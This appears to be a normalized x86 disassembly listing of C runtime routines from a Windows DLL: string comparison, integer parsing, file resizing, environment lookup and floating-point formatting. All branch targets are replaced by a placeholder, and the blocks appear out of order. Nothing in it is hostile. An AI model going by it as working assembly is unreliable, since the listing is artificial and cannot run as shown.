cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_10035af7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
inc ecx
inc ecx
inc edx
inc edx
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_10035b2e
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_10023358
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_10026065
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1002d3c5
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_10026065
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_10035d5d
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10035b2e
add esp 0x14
pop ebp
retn
sub_10035da7
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_10035dd4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_10031912
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_10026065
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_10031912
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_10031912
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10031912
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_10035f8a
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_10026065
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_10032ee4
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_10026065
mov [ eax ] 0xd
call sub_10026078
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_10026078
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_10026065
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_1002aebb
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_10035f8a
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_10035f8a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_10036046
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_1003607f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_100200e0
pop ecx
mov edi eax
jmp r-xdata
call sub_1003725d
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_100200e0
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_10037243
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_10036110
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10036171
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1002776c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_1002776c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
